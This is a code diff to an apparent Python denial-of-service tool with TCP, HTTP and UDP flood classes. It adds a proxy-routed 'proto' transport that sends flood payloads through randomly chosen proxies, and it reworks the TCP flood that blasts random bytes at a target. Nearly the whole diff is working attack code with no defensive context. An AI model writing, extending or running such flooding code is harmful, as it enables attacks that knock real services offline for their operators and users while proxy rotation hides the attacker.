@@ -1,11 +1,8 @@
-import aiohttp
-import aiohttp_socks
 import asyncio
-from async_timeout import timeout
-
 from contextlib import suppress
 from copy import copy
 import errno
+from functools import partial
 from itertools import cycle
 import logging
 from math import log2, trunc
@@ -23,7 +20,11 @@ from time import sleep, time
 from typing import Any, List, Optional, Set, Tuple
 from urllib import parse
 
+import aiohttp
+import aiohttp_socks
+from async_timeout import timeout
 from cloudscraper import create_scraper
+from python_socks.async_.asyncio import Proxy
 from requests import Response, Session, cookies
 from yarl import URL
 
@@ -31,6 +32,7 @@ from .ImpactPacket import IP, TCP, UDP, Data
 from .core import cl, logger, ROOT_DIR, Stats
 from .proxies import ProxySet, NoProxySet
 
+from . import proto
 from . import proxy_tools as ProxyTools
 from .concurrency import scale_attack
 from .referers import REFERERS
@@ -606,8 +608,8 @@ def request_info_size(request: aiohttp.RequestInfo) -> int:
 class AttackSettings:
     TRANSPORT_STREAM = "stream"
     TRANSPORT_SOCK = "sock"
+    TRANSPORT_PROTO = "proto"
 
-    low_level_transport: bool
     connect_timeout_seconds: float
     drain_timeout_seconds: float
     close_timeout_seconds: float
@@ -627,7 +629,7 @@ class AttackSettings:
         tcp_read_timeout_seconds: float = 0.2,
         requests_per_connection: int = 1024,
         high_watermark: int = 1024 << 5,
-        reader_limit: int = 1024 << 4,
+        reader_limit: int = 1024 << 6,
     ):
         self.transport = transport
         self.connect_timeout_seconds = connect_timeout_seconds
@@ -638,10 +640,6 @@ class AttackSettings:
         self.requests_per_connection = requests_per_connection
         self.high_watermark = high_watermark
         self.reader_limit = reader_limit
-
-    @property
-    def low_level_transport(self) -> bool:
-        return self.transport == AttackSettings.TRANSPORT_SOCK
 
     def with_options(self, **kwargs) -> "AttackSettings":
         settings = copy(self)
@@ -719,7 +717,7 @@ class AsyncTcpFlood(HttpFlood):
     async def _close_connection(self, writer: asyncio.StreamWriter) -> None:
         if writer.can_write_eof():
             writer.write_eof()
-        elif self._settings.low_level_transport:
+        elif self._settings.transport == AttackSetting.TRANSPORT_SOCK:
             writer.get_extra_info("socket")._sock.close()
             self._stats.track_close_connection()
         else:
@@ -735,7 +733,7 @@ class AsyncTcpFlood(HttpFlood):
         if getattr(writer.transport, "_conn_lost", 0):
             raise RuntimeError("Connection lost unexpectedly (transport)")
 
-        if self._settings.low_level_transport:
+        if self._settings.transport == AttackSettings.TRANSPORT_SOCK:
             sock = writer.get_extra_info("socket")._sock
             async with timeout(self._settings.drain_timeout_seconds):
                 await self._loop.sock_sendall(sock, payload),
@@ -746,6 +744,12 @@ class AsyncTcpFlood(HttpFlood):
         self._stats.track(1, len(payload))
 
     async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
+        if self._settings.transport == AttackSettings.TRANSPORT_PROTO:
+            return await self._generic_flood_proto(payload, rpc=rpc)
+        else:
+            return await self._generic_flood_stream(payload, rpc=rpc)
+
+    async def _generic_flood_stream(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
         rpc = rpc or self._settings.requests_per_connection
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await self.open_connection()
@@ -758,6 +762,25 @@ class AsyncTcpFlood(HttpFlood):
         finally:
             await self._close_connection(writer)
         return packets_sent > 0
+    
+    async def _generic_flood_proto(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
+        on_done = self._loop.create_future()
+        proxy_url: str = self._proxies.pick_random()
+        proxy = Proxy.from_url(proxy_url)
+        proxy_protocol = proto.for_proxy(proxy) 
+        is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
+        ssl_ctx = ctx if is_tls else None
+
+        def _protocol_factory():
+            return proxy_protocol(
+                self._loop, proxy_url, proxy, self._raw_target, ssl_ctx, on_done,
+                downstream_factory = partial(
+                    proto.FloodAttackProtocol,
+                    self._loop, self._stats, payload, self._settings, on_done))
+        
+        await self._loop.create_connection(
+            _protocol_factory, host=proxy.proxy_host, port=proxy.proxy_port)
+        return bool(await on_done)
 
     # XXX: again, with functions it's just a partial
     async def GET(self) -> bool:
@@ -970,16 +993,19 @@ class AsyncTcpFlood(HttpFlood):
 
     async def TCP(self) -> bool:
         packets_sent, packet_size = 0, 1024
-        reader, writer = await self.open_connection()
-        try:
-            for _ in range(self._settings.requests_per_connection):
-                payload: bytes = randbytes(packet_size)
-                await self._send_packet(writer, payload)
-                packets_sent += 1
-        finally:
-            await self._close_connection(writer)
-        return packets_sent > 0
-
+        if self._settings.transport == AttackSettings.TRANSPORT_PROTO:
+            payload: bytes = randbytes(packet_size)
+            return await self._generic_flood_proto(payload)
+        else:
+            reader, writer = await self.open_connection()
+            try:
+                for _ in range(self._settings.requests_per_connection):
+                    payload: bytes = randbytes(packet_size)
+                    await self._send_packet(writer, payload)
+                    packets_sent += 1
+            finally:
+                await self._close_connection(writer)
+            return packets_sent > 0
 
 class AsyncUdpFlood(Layer4):
 
